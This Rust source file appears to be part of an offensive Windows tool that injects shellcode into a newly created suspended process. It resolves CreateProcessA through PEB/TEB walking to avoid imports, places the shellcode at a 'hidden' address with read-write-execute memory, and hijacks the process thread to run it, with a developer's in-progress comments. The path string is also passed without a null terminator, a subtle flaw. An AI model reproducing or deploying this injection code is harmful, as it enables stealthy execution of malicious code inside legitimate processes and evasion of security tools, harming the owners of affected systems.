#![allow(non_snake_case)]
use noldr::{get_dll_address, get_function_address, get_teb};
pub use winapi;
use winapi::{
    ctypes::c_void,
    um::{
        processthreadsapi::{PROCESS_INFORMATION, STARTUPINFOA},
        winbase::{DEBUG_PROCESS, DETACHED_PROCESS, NORMAL_PRIORITY_CLASS},
    },
};

use std::ffi::c_void as std_c_void;

mod func;

pub fn inject_shellcode(process_name: &str, shellcode: &[u8]) -> Result<(), String> {
    //get the teb with noldr
    let teb = get_teb();

    let kernel32 = match get_dll_address("kernel32.dll".to_string(), teb) {
        Some(addr) => addr,
        None => return Err("Failed to get kernel32.dll address".to_string()),
    };

    let pi = CreateSuspendedProcess(kernel32, process_name);

    // Check if process creation failed (zeroed PI struct)
    if pi.hProcess.is_null() || pi.hThread.is_null() {
        return Err("Failed to create suspended process".to_string());
    }

    let process_handle = pi.hProcess;

    let shellcode_size = shellcode.len();

    //YOU ARE HERE. need to pass the teb to get_hidden_injection_address and use noldr to load our functions instead of using the crate

    let shellcode_location = func::get_hidden_injection_address(process_handle, shellcode_size)
        .map_err(|e| format!("Failed to get injection address: {}", e))?;

    if !func::inject_and_rwx(process_handle, shellcode_location, shellcode) {
        return Err("Failed to inject shellcode".to_string());
    }

    if !func::snap_thread_hijack(
        pi.dwProcessId,
        pi.hThread,
        pi.dwThreadId,
        process_handle,
        Some(shellcode_location),
        None,
        kernel32 as *mut std_c_void,
    ) {
        return Err("Failed to hijack thread".to_string());
    }

    Ok(())
}

//we are going to switch to dynamic loading with noldr

fn CreateSuspendedProcess(
    kernel32: *const std::ffi::c_void,
    process_name: &str,
) -> PROCESS_INFORMATION {
    // Format the process path
    let process_path = if !process_name.contains('\\') {
        format!("C:\\Windows\\System32\\{}", process_name)
    } else {
        process_name.to_string()
    };

    // Create the startup info and process info structs
    let mut si: STARTUPINFOA = unsafe { std::mem::zeroed() };
    let mut pi: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };
    si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;

    let function_address = match get_function_address(kernel32, "CreateProcessA") {
        Some(addr) => addr,
        None => {
            println!("Failed to get CreateProcessA address");
            return unsafe { std::mem::zeroed() };
        }
    };

    //define the function signature
    type CreateProcessAType = unsafe extern "system" fn(
        *const i8,
        *mut i8,
        *mut c_void,
        *mut c_void,
        i32,
        u32,
        *mut c_void,
        *const i8,
        *mut STARTUPINFOA,
        *mut PROCESS_INFORMATION,
    ) -> i32;

    //call the function
    let _success = unsafe {
        std::mem::transmute::<_, CreateProcessAType>(function_address)(
            std::ptr::null(),
            process_path.as_ptr() as *mut i8,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            1,
            NORMAL_PRIORITY_CLASS | DETACHED_PROCESS | DEBUG_PROCESS,
            std::ptr::null_mut(),
            std::ptr::null(),
            &mut si,
            &mut pi,
        )
    };

    pi
}
